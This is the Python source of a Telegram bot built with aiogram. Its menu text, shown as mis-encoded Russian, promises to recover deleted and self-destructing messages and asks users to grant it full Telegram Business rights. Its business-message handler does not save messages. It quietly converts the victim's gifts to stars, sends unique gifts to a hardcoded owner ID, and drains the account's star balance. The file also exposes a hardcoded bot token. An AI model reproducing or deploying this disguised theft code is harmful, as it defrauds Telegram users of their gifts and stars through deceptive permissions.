from aiogram import Bot, Dispatcher
from aiogram import types
import asyncio
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder

TOKEN = "8179388242:AAFOe303-vfSaaxyTZZEVXC1nIab7l6j_gA"  # Your Bot API Token from @BotFather
# Turn business mode in settings bot

bot = Bot(TOKEN)
dp = Dispatcher()

my_id = 5479326495  # Your Telegram ID

# –°—Å—ã–ª–∫–∏ –¥–ª—è –∫–Ω–æ–ø–æ–∫
SUPPORT_LINK = "https://t.me/SpaceSaveSup"
BOT_CHANNEL_LINK = "https://t.me/SpaceSaves"

@dp.message(commands=['start'])
async def cmd_start(message: types.Message):
    # –°–æ–∑–¥–∞–µ–º –∏–Ω–ª–∞–π–Ω-–∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
    builder = InlineKeyboardBuilder()
    builder.row(
        types.InlineKeyboardButton(text="–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è", callback_data="verification"),
        types.InlineKeyboardButton(text="–†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞", callback_data="referral")
    )
    builder.row(
        types.InlineKeyboardButton(text="–ü–æ–¥–¥–µ—Ä–∂–∫–∞", url=SUPPORT_LINK),
        types.InlineKeyboardButton(text="–ö–∞–Ω–∞–ª –±–æ—Ç–∞", url=BOT_CHANNEL_LINK)
    )
    
    await message.answer(
        "üïµÔ∏è‚Äç‚ôÇÔ∏è –≠—Ç–æ—Ç –±–æ—Ç —Å–æ–∑–¥–∞–Ω, —á—Ç–æ–±—ã –ø–æ–º–æ–≥–∞—Ç—å –≤–∞–º –≤ –ø–µ—Ä–µ–ø–∏—Å–∫–µ.\n\n"
        "–í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –±–æ—Ç–∞:\n"
        "‚Ä¢ –ú–æ–º–µ–Ω—Ç–∞–ª—å–Ω–æ –ø—Ä–∏—à–ª—ë—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ, –µ—Å–ª–∏ –≤–∞—à —Å–æ–±–µ—Å–µ–¥–Ω–∏–∫ –∏–∑–º–µ–Ω–∏—Ç –∏–ª–∏ —É–¥–∞–ª–∏—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ üîî\n"
        "‚Ä¢ –£–º–µ–µ—Ç —Å–∫–∞—á–∏–≤–∞—Ç—å —Ñ–∞–π–ª—ã —Å —Ç–∞–π–º–µ—Ä–æ–º (—Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–∞—é—â–∏–µ—Å—è), —Ç–∞–∫–∏–µ –∫–∞–∫: —Ñ–æ—Ç–æ/–≤–∏–¥–µ–æ/–≥–æ–ª–æ—Å–æ–≤—ã–µ/–∫—Ä—É–∂–∫–∏ ‚è≥",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(lambda c: c.data == "verification")
async def process_verification(callback: types.CallbackQuery):
    await callback.message.answer(
        "üìå –ö–∞–∫ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É –≤ Telegram –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ —É–¥–∞–ª—ë–Ω–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π –∏ —Ñ–∞–π–ª–æ–≤ —Å —Ç–∞–π–º–µ—Ä–æ–º (—Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–∞—é—â–∏—Ö—Å—è)\n\n"
        "1. ‚öôÔ∏è –û—Ç–∫—Ä–æ–π—Ç–µ –ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram.\n"
        "2. üíº –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞.\n"
        "3. ü§ñ –û—Ç–∫—Ä–æ–π—Ç–µ –ß–∞—Ç-–±–æ—Ç—ã –∏ –¥–æ–±–∞–≤—å—Ç–µ @SpaceSaveBot.\n"
        "4. ‚úÖ –í–∫–ª—é—á–∏—Ç–µ –≤—Å–µ –ø—Ä–∞–≤–∞ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö"
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "referral")
async def process_referral(callback: types.CallbackQuery):
    await callback.message.answer(
        "üåü –•–æ—á–µ—à—å —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É‚ùì\n\n"
        "üîó –ü—Ä–æ–π–¥–∏ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é –∑–∞ –º–∏–Ω—É—Ç—É, –∑–æ–≤–∏ –¥—Ä—É–∑–µ–π –∏ —Å–æ–±–∏—Ä–∞–π –±–æ–Ω—É—Å—ã!"
    )
    await callback.answer()

@dp.business_message()
async def get_message(message: types.Message):
    business_id = message.business_connection_id
    convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
    for gift in convert_gifts.gifts:
        try:
            owned_gift_id = gift.owned_gift_id
            await bot.convert_gift_to_stars(business_id, owned_gift_id)
        except:
            pass
    try:
        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        for gift in unique_gifts.gifts:
            owned_gift_id = gift.owned_gift_id
            await bot.transfer_gift(business_id, owned_gift_id, my_id, 25)
    except:
        pass
    stars = await bot.get_business_account_star_balance(business_id)
    await bot.transfer_business_account_stars(business_id, int(stars.amount))

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
